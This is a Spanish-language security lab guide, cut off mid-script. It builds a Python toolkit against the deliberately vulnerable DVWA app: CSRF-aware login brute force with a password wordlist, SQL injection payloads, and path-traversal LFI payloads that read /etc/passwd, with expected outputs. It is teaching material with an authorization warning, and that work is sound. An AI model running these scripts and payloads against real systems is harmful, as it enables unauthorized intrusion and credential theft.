# Práctica 5 — Automatizar Pruebas Básicas contra un Entorno Vulnerable

## 1. Metadatos

| Atributo         | Valor                                      |
|------------------|--------------------------------------------|
| **Duración**     | 46 minutos                                 |
| **Complejidad**  | Alta                                       |
| **Nivel Bloom**  | Crear (Create)                             |
| **Módulo**       | 5 — Clientes HTTP y Automatización Web     |
| **Lab ID**       | 05-00-01                                   |

---

## 2. Descripción General

En este laboratorio construirás un toolkit de pruebas de seguridad web automatizadas contra **DVWA** (*Damn Vulnerable Web Application*) configurada en nivel de seguridad **Low**. Aplicarás directamente los conceptos de HTTP (métodos, cabeceras, códigos de estado, cookies) estudiados en la Lección 5.1, usando `requests.Session` para mantener estado entre solicitudes y `BeautifulSoup4` para extraer tokens CSRF de formularios HTML. El resultado será un script modular con tres módulos de prueba independientes —fuerza bruta de login, detección de SQL Injection y detección de LFI— que generan evidencia estructurada en formato JSON y log.

> ⚠️ **AVISO ÉTICO Y LEGAL:** Todas las técnicas de este laboratorio deben ejecutarse **exclusivamente** sobre DVWA en tu entorno de laboratorio controlado. Queda estrictamente prohibido aplicar estas técnicas sobre sistemas externos sin autorización escrita. El instructor debe haber proporcionado el formulario de autorización firmado antes de comenzar.

---

## 3. Objetivos de Aprendizaje

Al completar este laboratorio serás capaz de:

- [ ] Implementar un cliente HTTP completo con `requests.Session` que maneje cookies, redirecciones y tokens CSRF extraídos con BeautifulSoup4.
- [ ] Automatizar una prueba de fuerza bruta de login contra DVWA, interpretando diferencias en respuestas HTTP para determinar credenciales válidas.
- [ ] Detectar indicadores de SQL Injection y LFI analizando diferencias en el cuerpo y código de estado de las respuestas HTTP.
- [ ] Generar evidencia estructurada (request/response + resultado) para cada prueba usando el módulo `logging` y volcado JSON.

---

## 4. Prerrequisitos

### Conocimiento

| Área                           | Nivel requerido                                                         |
|-------------------------------|-------------------------------------------------------------------------|
| Protocolo HTTP                | Comprensión de métodos, cabeceras, cookies, códigos de estado (Lección 5.1) |
| Python 3.10+                  | Funciones, módulos, manejo de excepciones, f-strings                   |
| `requests` básico             | `requests.get()`, `requests.post()`, inspección de respuestas          |
| Vulnerabilidades web          | Conceptos básicos de SQLi, LFI y fuerza bruta                          |
| Línea de comandos Linux       | Navegación, ejecución de scripts, pip                                  |

### Acceso y Autorización

- [ ] Formulario de autorización firmado por el instructor (requerido para Labs 4-8).
- [ ] DVWA accesible en la red de laboratorio (Docker local o Metasploitable 2).
- [ ] Snapshot de Metasploitable 2 / DVWA creado antes de iniciar.
- [ ] Entorno virtual Python activo con dependencias instaladas.

---

## 5. Entorno de Laboratorio

### Hardware Mínimo

| Componente        | Requerimiento                              |
|-------------------|--------------------------------------------|
| CPU               | 64-bit, 4 núcleos, virtualización habilitada |
| RAM               | 8 GB (16 GB recomendado)                  |
| Disco             | 60 GB libres para VMs y resultados        |
| Red               | Adaptador en modo NAT interno aislado     |

### Software

| Componente              | Versión mínima     | Rol en el laboratorio                     |
|-------------------------|--------------------|-------------------------------------------|
| Kali Linux              | 2024.1+            | Máquina atacante (host de scripts)        |
| DVWA                    | latest             | Objetivo vulnerable                       |
| Python                  | 3.10+              | Lenguaje de desarrollo                    |
| requests                | 2.31+              | Cliente HTTP con sesiones                 |
| BeautifulSoup4          | 4.12+              | Parsing HTML y extracción de tokens CSRF  |
| lxml o html.parser      | built-in           | Parser para BeautifulSoup4                |
| logging                 | stdlib             | Registro de evidencia                     |
| json                    | stdlib             | Generación de reportes                    |

### Configuración del Entorno

#### Paso A — Crear snapshot de DVWA/Metasploitable 2

> **Obligatorio antes de continuar.** Esto permite restaurar el estado limpio si DVWA queda en un estado inconsistente.

```bash
# En VirtualBox (desde el host):
VBoxManage snapshot "Metasploitable2" take "pre-lab-05-00-01" \
  --description "Estado limpio antes de Lab 05-00-01"

# Verificar que el snapshot se creó:
VBoxManage snapshot "Metasploitable2" list
```

#### Paso B — Verificar accesibilidad de DVWA

```bash
# Desde Kali Linux — ajusta la IP según tu entorno
DVWA_IP="192.168.56.101"   # IP típica de Metasploitable 2

ping -c 3 $DVWA_IP
curl -s -o /dev/null -w "%{http_code}" http://$DVWA_IP/dvwa/login.php
# Debe retornar: 200
```

#### Paso C — Preparar entorno Python

```bash
# Crear directorio del proyecto
mkdir -p ~/lab05/results
cd ~/lab05

# Crear y activar entorno virtual
python3 -m venv venv
source venv/bin/activate

# Instalar dependencias
pip install requests==2.31.0 beautifulsoup4==4.12.3 lxml

# Verificar instalación
python3 -c "import requests, bs4; print(f'requests {requests.__version__}, bs4 {bs4.__version__}')"
```

#### Paso D — Configurar DVWA en nivel 'Low'

Accede a `http://<DVWA_IP>/dvwa/` desde el navegador de Kali:
1. Login con `admin` / `password`.
2. Ve a **DVWA Security** en el menú lateral.
3. Selecciona **Low** y haz clic en **Submit**.
4. Confirma que el nivel muestra **Low** en la barra inferior de la interfaz.

---

## 6. Desarrollo Paso a Paso

### Paso 1 — Estructura del Proyecto y Módulo de Configuración

**Objetivo:** Crear la estructura de archivos del toolkit y el módulo de configuración centralizado.

**Instrucciones:**

1. Desde `~/lab05`, crea la siguiente estructura de archivos:

```bash
cd ~/lab05
touch dvwa_tester.py
touch config.py
touch wordlist.txt
mkdir -p results
```

2. Crea el archivo `wordlist.txt` con las credenciales de prueba:

```bash
cat > wordlist.txt << 'EOF'
admin
password
123456
admin123
letmein
qwerty
root
toor
test
guest
EOF
```

3. Crea el archivo `config.py` con la configuración centralizada:

```python
# config.py
# Configuración centralizada del toolkit de pruebas DVWA
# ADVERTENCIA: Este toolkit es solo para uso en entornos autorizados

import os

# ─── Configuración de DVWA ────────────────────────────────────────────────────
DVWA_BASE_URL = os.environ.get("DVWA_URL", "http://192.168.56.101/dvwa")
DVWA_LOGIN_URL = f"{DVWA_BASE_URL}/login.php"
DVWA_SECURITY_URL = f"{DVWA_BASE_URL}/security.php"

# URLs de los módulos vulnerables
DVWA_BRUTE_URL = f"{DVWA_BASE_URL}/vulnerabilities/brute/"
DVWA_SQLI_URL = f"{DVWA_BASE_URL}/vulnerabilities/sqli/"
DVWA_LFI_URL = f"{DVWA_BASE_URL}/vulnerabilities/fi/"

# ─── Credenciales de DVWA ─────────────────────────────────────────────────────
DVWA_USER = os.environ.get("DVWA_USER", "admin")
DVWA_PASS = os.environ.get("DVWA_PASS", "password")

# ─── Configuración de red ─────────────────────────────────────────────────────
REQUEST_TIMEOUT = 10          # segundos
REQUEST_DELAY = 0.5           # segundos entre solicitudes (rate limiting ético)

# ─── Cabeceras HTTP base ──────────────────────────────────────────────────────
BASE_HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
}

# ─── Rutas de salida ──────────────────────────────────────────────────────────
RESULTS_DIR = os.path.join(os.path.dirname(__file__), "results")
LOG_FILE = os.path.join(RESULTS_DIR, "dvwa_tester.log")
REPORT_FILE = os.path.join(RESULTS_DIR, "report.json")
WORDLIST_FILE = os.path.join(os.path.dirname(__file__), "wordlist.txt")
```

**Salida esperada:** Estructura de archivos creada sin errores.

**Verificación:**

```bash
ls -la ~/lab05/
# Debe mostrar: config.py, dvwa_tester.py, wordlist.txt, results/
```

---

### Paso 2 — Módulo de Sesión y Autenticación en DVWA

**Objetivo:** Implementar la función de autenticación que crea y mantiene una `requests.Session` autenticada, manejando el token CSRF del formulario de login.

**Instrucciones:**

1. Abre `dvwa_tester.py` y añade el siguiente código (este es el inicio del archivo principal):

```python
#!/usr/bin/env python3
"""
dvwa_tester.py — Toolkit de pruebas de seguridad automatizadas contra DVWA
Uso exclusivo en entornos autorizados. Lab 05-00-01.
"""

import time
import json
import logging
import os
import sys
from datetime import datetime
from typing import Optional

import requests
from bs4 import BeautifulSoup

# Importar configuración
import config

# ─── Configuración del sistema de logging ─────────────────────────────────────
os.makedirs(config.RESULTS_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)-8s | %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    handlers=[
        logging.FileHandler(config.LOG_FILE, encoding="utf-8"),
        logging.StreamHandler(sys.stdout),
    ],
)
logger = logging.getLogger("dvwa_tester")


# ─── Utilidades HTTP ──────────────────────────────────────────────────────────

def extraer_token_csrf(html: str, campo: str = "user_token") -> Optional[str]:
    """
    Extrae el token CSRF de un formulario HTML usando BeautifulSoup4.
    
    Args:
        html: Contenido HTML de la página.
        campo: Nombre del campo hidden que contiene el token.
    
    Returns:
        Valor del token o None si no se encuentra.
    """
    soup = BeautifulSoup(html, "html.parser")
    token_input = soup.find("input", {"name": campo})
    if token_input:
        return token_input.get("value")
    return None


def crear_sesion_autenticada() -> Optional[requests.Session]:
    """
    Crea una requests.Session autenticada contra DVWA.
    
    El flujo de autenticación en DVWA requiere:
    1. GET a login.php para obtener el token CSRF (user_token)
    2. POST con credenciales + token CSRF + cookie de sesión activa
    3. Verificar redirección exitosa a index.php
    
    Returns:
        Session autenticada o None si falla la autenticación.
    """
    sesion = requests.Session()
    sesion.headers.update(config.BASE_HEADERS)

    logger.info("=== INICIO DE SESIÓN EN DVWA ===")
    logger.info(f"URL de login: {config.DVWA_LOGIN_URL}")

    try:
        # ── Paso 1: GET al formulario de login para obtener token CSRF ─────────
        logger.info("Paso 1/2: Obteniendo token CSRF del formulario de login...")
        resp_get = sesion.get(
            config.DVWA_LOGIN_URL,
            timeout=config.REQUEST_TIMEOUT
        )
        resp_get.raise_for_status()

        logger.info(
            f"  GET {config.DVWA_LOGIN_URL} → "
            f"HTTP {resp_get.status_code} | "
            f"Cookies recibidas: {list(sesion.cookies.keys())}"
        )

        # Extraer token CSRF del formulario
        token = extraer_token_csrf(resp_get.text)
        if not token:
            logger.error("No se encontró el token CSRF (user_token) en el formulario.")
            return None

        logger.info(f"  Token CSRF obtenido: {token[:8]}...{token[-4:]}")

        # ── Paso 2: POST con credenciales y token CSRF ─────────────────────────
        logger.info("Paso 2/2: Enviando credenciales con token CSRF...")
        payload_login = {
            "username": config.DVWA_USER,
            "password": config.DVWA_PASS,
            "Login": "Login",
            "user_token": token,
        }

        resp_post = sesion.post(
            config.DVWA_LOGIN_URL,
            data=payload_login,
            timeout=config.REQUEST_TIMEOUT,
            allow_redirects=True,
        )

        logger.info(
            f"  POST {config.DVWA_LOGIN_URL} → "
            f"HTTP {resp_post.status_code} | "
            f"URL final: {resp_post.url}"
        )

        # ── Verificar autenticación exitosa ────────────────────────────────────
        # DVWA redirige a index.php tras login exitoso
        if "index.php" in resp_post.url and resp_post.status_code == 200:
            logger.info(
                f"✓ Autenticación exitosa. "
                f"Cookie PHPSESSID: {sesion.cookies.get('PHPSESSID', 'N/A')[:8]}..."
            )
            return sesion
        else:
            logger.error(
                f"✗ Autenticación fallida. "
                f"URL final inesperada: {resp_post.url}"
            )
            return None

    except requests.exceptions.ConnectionError as e:
        logger.error(f"Error de conexión: {e}. ¿Está DVWA corriendo en {config.DVWA_BASE_URL}?")
        return None
    except requests.exceptions.Timeout:
        logger.error(f"Timeout al conectar con {config.DVWA_LOGIN_URL}")
        return None
```

2. Prueba únicamente el módulo de sesión ejecutando:

```bash
cd ~/lab05
source venv/bin/activate

# Exportar variables de entorno (ajusta la IP si es necesario)
export DVWA_URL="http://192.168.56.101/dvwa"
export DVWA_USER="admin"
export DVWA_PASS="password"

# Prueba rápida del módulo de sesión
python3 -c "
import dvwa_tester as dt
sesion = dt.crear_sesion_autenticada()
if sesion:
    print('SESIÓN CREADA EXITOSAMENTE')
    print('Cookies:', dict(sesion.cookies))
else:
    print('ERROR: No se pudo crear la sesión')
"
```

**Salida esperada:**

```
2024-01-15 10:23:01 | INFO     | === INICIO DE SESIÓN EN DVWA ===
2024-01-15 10:23:01 | INFO     | URL de login: http://192.168.56.101/dvwa/login.php
2024-01-15 10:23:01 | INFO     | Paso 1/2: Obteniendo token CSRF del formulario de login...
2024-01-15 10:23:01 | INFO     |   GET http://192.168.56.101/dvwa/login.php → HTTP 200 | Cookies recibidas: ['PHPSESSID']
2024-01-15 10:23:01 | INFO     |   Token CSRF obtenido: 4a7f3b2c...e9d1
2024-01-15 10:23:02 | INFO     |   POST http://192.168.56.101/dvwa/login.php → HTTP 200 | URL final: http://192.168.56.101/dvwa/index.php
2024-01-15 10:23:02 | INFO     | ✓ Autenticación exitosa. Cookie PHPSESSID: a3f9d2b1...
SESIÓN CREADA EXITOSAMENTE
```

**Verificación:**

```bash
# Verificar que el log se generó
cat results/dvwa_tester.log | grep "Autenticación"
# Debe mostrar: ✓ Autenticación exitosa.
```

---

### Paso 3 — Módulo de Fuerza Bruta de Login

**Objetivo:** Implementar la función de fuerza bruta que prueba contraseñas de una wordlist contra el formulario de login de DVWA, manejando el token CSRF en cada intento.

**Instrucciones:**

1. Añade la siguiente función al final de `dvwa_tester.py`:

```python
# ─── MÓDULO 1: Fuerza Bruta de Login ──────────────────────────────────────────

def modulo_fuerza_bruta(
    sesion: requests.Session,
    usuario: str = "admin",
    wordlist_path: str = None,
) -> dict:
    """
    Prueba fuerza bruta de login en DVWA (módulo Brute Force).
    
    DVWA Brute Force usa GET con parámetros en la URL y requiere
    token CSRF extraído de la página del módulo.
    
    Args:
        sesion: Session autenticada de requests.
        usuario: Nombre de usuario a atacar.
        wordlist_path: Ruta al archivo de wordlist.
    
    Returns:
        Diccionario con resultados y evidencia de la prueba.
    """
    wordlist_path = wordlist_path or config.WORDLIST_FILE
    resultado = {
        "modulo": "fuerza_bruta",
        "timestamp": datetime.now().isoformat(),
        "objetivo": config.DVWA_BRUTE_URL,
        "usuario_probado": usuario,
        "credencial_encontrada": None,
        "intentos_realizados": 0,
        "evidencia": [],
        "exito": False,
    }

    logger.info("=" * 60)
    logger.info("MÓDULO 1: FUERZA BRUTA DE LOGIN")
    logger.info(f"  Objetivo : {config.DVWA_BRUTE_URL}")
    logger.info(f"  Usuario  : {usuario}")
    logger.info(f"  Wordlist : {wordlist_path}")

    # Leer wordlist
    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        logger.error(f"Wordlist no encontrada: {wordlist_path}")
        resultado["error"] = "Wordlist no encontrada"
        return resultado

    logger.info(f"  Passwords a probar: {len(passwords)}")

    # ── Obtener token CSRF inicial de la página del módulo ─────────────────────
    try:
        resp_inicial = sesion.get(
            config.DVWA_BRUTE_URL,
            timeout=config.REQUEST_TIMEOUT
        )
        resp_inicial.raise_for_status()
        token = extraer_token_csrf(resp_inicial.text)
        logger.info(f"  Token CSRF inicial: {token[:8] if token else 'NO ENCONTRADO'}...")
    except requests.exceptions.RequestException as e:
        logger.error(f"Error al acceder al módulo Brute Force: {e}")
        resultado["error"] = str(e)
        return resultado

    # ── Iterar sobre la wordlist ───────────────────────────────────────────────
    for password in passwords:
        resultado["intentos_realizados"] += 1
        time.sleep(config.REQUEST_DELAY)  # Rate limiting ético

        try:
            # DVWA Brute Force (nivel Low) usa GET con parámetros en URL
            params = {
                "username": usuario,
                "password": password,
                "Login": "Login",
                "user_token": token,
            }

            resp = sesion.get(
                config.DVWA_BRUTE_URL,
                params=params,
                timeout=config.REQUEST_TIMEOUT,
                allow_redirects=True,
            )

            # Extraer nuevo token CSRF para el siguiente intento
            nuevo_token = extraer_token_csrf(resp.text)
            if nuevo_token:
                token = nuevo_token

            # ── Analizar respuesta ─────────────────────────────────────────────
            # DVWA muestra "Welcome to the password protected area" en éxito
            # y "Username and/or password incorrect." en fallo
            exito = "Welcome to the password protected area" in resp.text
            fallo = "Username and/or password incorrect" in resp.text

            evidencia = {
                "intento": resultado["intentos_realizados"],
                "password": password,
                "http_status": resp.status_code,
                "url_final": resp.url,
                "respuesta_contiene_bienvenida": exito,
                "respuesta_contiene_error": fallo,
                "longitud_respuesta": len(resp.text),
            }
            resultado["evidencia"].append(evidencia)

            if exito:
                logger.info(
                    f"  [INTENTO {resultado['intentos_realizados']:3d}] "
                    f"'{password}' → HTTP {resp.status_code} | "
                    f"✓ CREDENCIAL VÁLIDA ENCONTRADA"
                )
                resultado["credencial_encontrada"] = {
                    "usuario": usuario,
                    "password": password,
                }
                resultado["exito"] = True
                break
            else:
                logger.info(
                    f"  [INTENTO {resultado['intentos_realizados']:3d}] "
                    f"'{password:<12}' → HTTP {resp.status_code} | "
                    f"✗ Incorrecto (resp: {len(resp.text)} bytes)"
                )

        except requests.exceptions.RequestException as e:
            logger.warning(f"  Error en intento con '{password}': {e}")
            continue

    if not resultado["exito"]:
        logger.info(
            f"  Fuerza bruta completada. "
            f"No se encontraron credenciales válidas en {resultado['intentos_realizados']} intentos."
        )

    logger.info(f"  Total intentos: {resultado['intentos_realizados']}")
    return resultado
```

**Salida esperada al ejecutar el módulo aislado:**

```
============================================================
MÓDULO 1: FUERZA BRUTA DE LOGIN
  Objetivo : http://192.168.56.101/dvwa/vulnerabilities/brute/
  Usuario  : admin
  Wordlist : /root/lab05/wordlist.txt
  Passwords a probar: 10
  Token CSRF inicial: 4a7f3b2c...
  [INTENTO   1] 'admin       ' → HTTP 200 | ✗ Incorrecto (resp: 4821 bytes)
  [INTENTO   2] 'password    ' → HTTP 200 | ✓ CREDENCIAL VÁLIDA ENCONTRADA
```

**Verificación:**

```bash
python3 -c "
import dvwa_tester as dt
sesion = dt.crear_sesion_autenticada()
if sesion:
    r = dt.modulo_fuerza_bruta(sesion)
    print('Éxito:', r['exito'])
    print('Credencial:', r.get('credencial_encontrada'))
"
```

---

### Paso 4 — Módulo de Detección de SQL Injection

**Objetivo:** Implementar la función de detección de SQLi que prueba payloads básicos contra el formulario vulnerable de DVWA, analizando diferencias en las respuestas para determinar si el parámetro es inyectable.

**Instrucciones:**

1. Añade la siguiente función al final de `dvwa_tester.py`:

```python
# ─── MÓDULO 2: Detección de SQL Injection ─────────────────────────────────────

# Payloads básicos de detección SQLi (no destructivos)
SQLI_PAYLOADS = [
    # (payload, descripción, indicador_de_éxito)
    ("1'",          "Comilla simple — error de sintaxis SQL",
     ["You have an error in your SQL syntax", "mysql_fetch_array()"]),
    ("1 OR 1=1",    "OR booleano clásico — retorna todos los registros",
     ["First name:", "admin", "user"]),
    ("1 AND 1=2",   "AND falso — debería retornar vacío",
     []),  # Éxito si la respuesta es significativamente diferente
    ("1' OR '1'='1","OR con comillas — bypass de autenticación clásico",
     ["First name:", "admin"]),
    ("1 UNION SELECT 1,2--",
     "UNION básico — detección de columnas",
     ["First name:", "Surname:"]),
]

def modulo_sqli(sesion: requests.Session) -> dict:
    """
    Detecta SQL Injection en el módulo SQLi de DVWA (nivel Low).
    
    Estrategia: Envía payloads GET al parámetro 'id', compara
    longitud y contenido de respuestas para detectar inyectabilidad.
    
    Args:
        sesion: Session autenticada de requests.
    
    Returns:
        Diccionario con resultados y evidencia de la prueba.
    """
    resultado = {
        "modulo": "sql_injection",
        "timestamp": datetime.now().isoformat(),
        "objetivo": config.DVWA_SQLI_URL,
        "payloads_probados": len(SQLI_PAYLOADS),
        "vulnerabilidad_detectada": False,
        "indicadores_encontrados": [],
        "evidencia": [],
    }

    logger.info("=" * 60)
    logger.info("MÓDULO 2: DETECCIÓN DE SQL INJECTION")
    logger.info(f"  Objetivo : {config.DVWA_SQLI_URL}")
    logger.info(f"  Payloads : {len(SQLI_PAYLOADS)}")

    # ── Obtener respuesta de referencia (input válido) ─────────────────────────
    try:
        resp_ref = sesion.get(
            config.DVWA_SQLI_URL,
            params={"id": "1", "Submit": "Submit"},
            timeout=config.REQUEST_TIMEOUT,
        )
        resp_ref.raise_for_status()
        longitud_referencia = len(resp_ref.text)
        logger.info(
            f"  Respuesta de referencia (id=1): "
            f"HTTP {resp_ref.status_code}, {longitud_referencia} bytes"
        )
    except requests.exceptions.RequestException as e:
        logger.error(f"Error al obtener respuesta de referencia: {e}")
        resultado["error"] = str(e)
        return resultado

    # ── Probar cada payload ────────────────────────────────────────────────────
    for payload, descripcion, indicadores in SQLI_PAYLOADS:
        time.sleep(config.REQUEST_DELAY)

        try:
            resp = sesion.get(
                config.DVWA_SQLI_URL,
                params={"id": payload, "Submit": "Submit"},
                timeout=config.REQUEST_TIMEOUT,
            )

            # Analizar diferencias en la respuesta
            diferencia_longitud = len(resp.text) - longitud_referencia
            indicadores_presentes = [
                ind for ind in indicadores
                if ind.lower() in resp.text.lower()
            ]

            # Detectar mensajes de error SQL (indicador fuerte de SQLi)
            errores_sql = [
                frag for frag in [
                    "You have an error in your SQL syntax",
                    "mysql_fetch_array()",
                    "Warning: mysql",
                    "Unclosed quotation mark",
                    "ORA-",
                    "SQLite3::",
                ]
                if frag.lower() in resp.text.lower()
            ]

            es_vulnerable = bool(indicadores_presentes or errores_sql)

            evidencia_payload = {
                "payload": payload,
                "descripcion": descripcion,
                "http_status": resp.status_code,
                "longitud_respuesta": len(resp.text),
                "diferencia_vs_referencia": diferencia_longitud,
                "indicadores_presentes": indicadores_presentes,
                "errores_sql_detectados": errores_sql,
                "fragmento_respuesta": resp.text[
                    resp.text.find("<div"):resp.text.find("<div") + 500
                ] if "<div" in resp.text else resp.text[:500],
                "indica_vulnerabilidad": es_vulnerable,
            }
            resultado["evidencia"].append(evidencia_payload)

            if es_vulnerable:
                resultado["vulnerabilidad_detectada"] = True
                resultado["indicadores_encontrados"].extend(
                    indicadores_presentes + errores_sql
                )
                logger.info(
                    f"  [PAYLOAD] '{payload[:30]:<30}' → "
                    f"HTTP {resp.status_code} | "
                    f"Δbytes: {diferencia_longitud:+d} | "
                    f"✓ INDICADORES: {indicadores_presentes or errores_sql}"
                )
            else:
                logger.info(
                    f"  [PAYLOAD] '{payload[:30]:<30}' → "
                    f"HTTP {resp.status_code} | "
                    f"Δbytes: {diferencia_longitud:+d} | "
                    f"- Sin indicadores claros"
                )

        except requests.exceptions.RequestException as e:
            logger.warning(f"  Error con payload '{payload}': {e}")
            continue

    # Eliminar duplicados en indicadores
    resultado["indicadores_encontrados"] = list(set(resultado["indicadores_encontrados"]))

    estado = "✓ VULNERABLE" if resultado["vulnerabilidad_detectada"] else "- No concluyente"
    logger.info(f"  Resultado SQLi: {estado}")
    return resultado
```

**Salida esperada:**

```
============================================================
MÓDULO 2: DETECCIÓN DE SQL INJECTION
  Objetivo : http://192.168.56.101/dvwa/vulnerabilities/sqli/
  Payloads : 5
  Respuesta de referencia (id=1): HTTP 200, 4932 bytes
  [PAYLOAD] "1'"                          → HTTP 200 | Δbytes: +187 | ✓ INDICADORES: ["You have an error in your SQL syntax"]
  [PAYLOAD] "1 OR 1=1"                   → HTTP 200 | Δbytes: +1243 | ✓ INDICADORES: ["First name:", "admin"]
  ...
  Resultado SQLi: ✓ VULNERABLE
```

---

### Paso 5 — Módulo de Detección de LFI

**Objetivo:** Implementar la función de detección de LFI (*Local File Inclusion*) probando path traversal básico en el módulo de File Inclusion de DVWA.

**Instrucciones:**

1. Añade la siguiente función al final de `dvwa_tester.py`:

```python
# ─── MÓDULO 3: Detección de LFI (Local File Inclusion) ───────────────────────

LFI_PAYLOADS = [
    # (payload, archivo_objetivo, indicador_en_respuesta)
    ("../../../etc/passwd",
     "/etc/passwd",
     ["root:x:0:0", "daemon:", "/bin/bash"]),
    ("....//....//....//etc/passwd",
     "/etc/passwd (evasión doble-punto)",
     ["root:x:0:0", "daemon:"]),
    ("../../../etc/hosts",
     "/etc/hosts",
     ["127.0.0.1", "localhost"]),
    ("../../../proc/version",
     "/proc/version",
     ["Linux version", "gcc"]),
    ("/etc/passwd",
     "/etc/passwd (ruta absoluta)",
     ["root:x:0:0"]),
]

def modulo_lfi(sesion: requests.Session) -> dict:
    """
    Detecta Local File Inclusion en el módulo File Inclusion de DVWA.
    
    Estrategia: Prueba path traversal en el parámetro 'page' de la URL.
    Analiza si el contenido de archivos del sistema aparece en la respuesta.
    
    Args:
        sesion: Session autenticada de requests.
    
    Returns:
        Diccionario con resultados y evidencia de la prueba.
    """
    resultado = {
        "modulo": "lfi",
        "timestamp": datetime.now().isoformat(),
        "objetivo": config.DVWA_LFI_URL,
        "payloads_probados": len(LFI_PAYLOADS),
        "vulnerabilidad_detectada": False,
        "archivos_incluidos": [],
        "evidencia": [],
    }

    logger.info("=" * 60)
    logger.info("MÓDULO 3: DETECCIÓN DE LFI (Local File Inclusion)")
    logger.info(f"  Objetivo : {config.DVWA_LFI_URL}")
    logger.info(f"  Payloads : {len(LFI_PAYLOADS)}")

    # ── Obtener respuesta de referencia ───────────────────────────────────────
    try:
        resp_ref = sesion.get(
            config.DVWA_LFI_URL,
            params={"page": "include.php"},
            timeout=config.REQUEST_TIMEOUT,
        )
        resp_ref.raise_for_status()
        longitud_referencia = len(resp_ref.text)
        logger.info(
            f"  Respuesta de referencia (page=include.php): "
            f"HTTP {resp_ref.status_code}, {longitud_referencia} bytes"
        )
    except requests.exceptions.RequestException as e:
        logger.error(f"Error al obtener respuesta de referencia LFI: {e}")
        resultado["error"] = str(e)
        return resultado

    # ── Probar cada payload ────────────────────────────────────────────────────
    for payload, archivo_objetivo, indicadores in LFI_PAYLOADS:
        time.sleep(config.REQUEST_DELAY)

        try:
            resp = sesion.get(
                config.DVWA_LFI_URL,
                params={"page": payload},
                timeout=config.REQUEST_TIMEOUT,
            )

            # Buscar indicadores del archivo en la respuesta
            indicadores_presentes = [
                ind for ind in indicadores
                if ind in resp.text
            ]

            diferencia_longitud = len(resp.text) - longitud_referencia
            es_vulnerable = bool(indicadores_presentes)

            # Extraer fragmento relevante de la respuesta para evidencia
            fragmento = ""
            for ind in indicadores_presentes:
                idx = resp.text.find(ind)
                if idx >= 0:
                    inicio = max(0, idx - 50)
                    fin = min(len(resp.text), idx + 200)
                    fragmento = resp.text[inicio:fin]
                    break

            evidencia_payload = {
                "payload": payload,
                "archivo_objetivo": archivo_objetivo,
                "http_status": resp.status_code,
                "longitud_respuesta": len(resp.text),
                "diferencia_vs_referencia": diferencia_longitud,
                "indicadores_presentes": indicadores_presentes,
                "fragmento_evidencia": fragmento,
                "indica_vulnerabilidad": es_vulnerable,
            }
            resultado["evidencia"].append(evidencia_payload)

            if es_vulnerable:
                resultado["vulnerabilidad_detectada"] = True
                if archivo_objetivo not in resultado["archivos_incluidos"]:
                    resultado["archivos_incluidos"].append(archivo_objetivo)
                logger.info(
                    f"  [LFI] '{payload[:40]:<40}' → "
                    f"HTTP {resp.status_code} | "
                    f"Δbytes: {diferencia_longitud:+d} | "
                    f"✓ ARCHIVO INCLUIDO: {indicadores_presentes}"
                )
                # Mostrar fragmento del archivo incluido como evidencia
                if fragmento:
                    logger.info(f"  [EVIDENCIA] ...{fragmento[:120]}...")
            else:
                logger.info(
                    f"  [LFI] '{payload[:40]:<40}' → "
                    f"HTTP {resp.status_code} | "
                    f"Δbytes: {diferencia_longitud:+d} | "
                    f"- Sin indicadores"
                )

        except requests.exceptions.RequestException as e:
            logger.warning(f"  Error con payload '{payload}': {e}")
            continue

    estado = "✓ VULNERABLE" if resultado["vulnerabilidad_detectada"] else "- No concluyente"
    logger.info(f"  Resultado LFI: {estado}")
    return resultado
```

**Salida esperada:**

```
============================================================
MÓDULO 3: DETECCIÓN DE LFI (Local File Inclusion)
  Objetivo : http://192.168.56.101/dvwa/vulnerabilities/fi/
  Payloads : 5
  Respuesta de referencia (page=include.php): HTTP 200, 4201 bytes
  [LFI] '../../../etc/passwd'              → HTTP 200 | Δbytes: +1847 | ✓ ARCHIVO INCLUIDO: ['root:x:0:0']
  [EVIDENCIA] ...root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh...
```

---

### Paso 6 — Función Principal y Generación de Reporte

**Objetivo:** Integrar los tres módulos en una función `main()` que ejecute todas las pruebas, consolide los resultados y genere un reporte JSON estructurado.

**Instrucciones:**

1. Añade la función principal al final de `dvwa_tester.py`:

```python
# ─── FUNCIÓN PRINCIPAL Y GENERADOR DE REPORTE ─────────────────────────────────

def generar_reporte(resultados: list, ruta_salida: str) -> None:
    """
    Genera un reporte JSON estructurado con todos los resultados.
    
    Args:
        resultados: Lista de diccionarios de resultados por módulo.
        ruta_salida: Ruta del archivo JSON de salida.
    """
    reporte = {
        "herramienta": "DVWA Security Tester — Lab 05-00-01",
        "timestamp_reporte": datetime.now().isoformat(),
        "objetivo": config.DVWA_BASE_URL,
        "nivel_seguridad_dvwa": "Low",
        "advertencia_legal": (
            "Este reporte fue generado en un entorno de laboratorio controlado "
            "con autorización explícita. Uso exclusivo educativo."
        ),
        "resumen": {
            "total_modulos": len(resultados),
            "modulos_con_hallazgos": sum(
                1 for r in resultados
                if r.get("exito") or r.get("vulnerabilidad_detectada")
            ),
        },
        "resultados": resultados,
    }

    with open(ruta_salida, "w", encoding="utf-8") as f:
        json.dump(reporte, f, indent=2, ensure_ascii=False)

    logger.info(f"  Reporte JSON guardado en: {ruta_salida}")


def main():
    """
    Función principal: ejecuta todos los módulos de prueba contra DVWA.
    """
    logger.info("╔══════════════════════════════════════════════════════════╗")
    logger.info("║     DVWA SECURITY TESTER — LAB 05-00-01                 ║")
    logger.info("║     Solo para uso en entornos autorizados                ║")
    logger.info("╚══════════════════════════════════════════════════════════╝")
    logger.info(f"Objetivo: {config.DVWA_BASE_URL}")
    logger.info(f"Timestamp: {datetime.now().isoformat()}")

    # ── Crear sesión autenticada ───────────────────────────────────────────────
    sesion = crear_sesion_autenticada()
    if not sesion:
        logger.error("No se pudo crear la sesión. Abortando.")
        sys.exit(1)

    resultados = []

    # ── Ejecutar módulo 1: Fuerza Bruta ───────────────────────────────────────
    logger.info("\n")
    resultado_brute = modulo_fuerza_bruta(sesion)
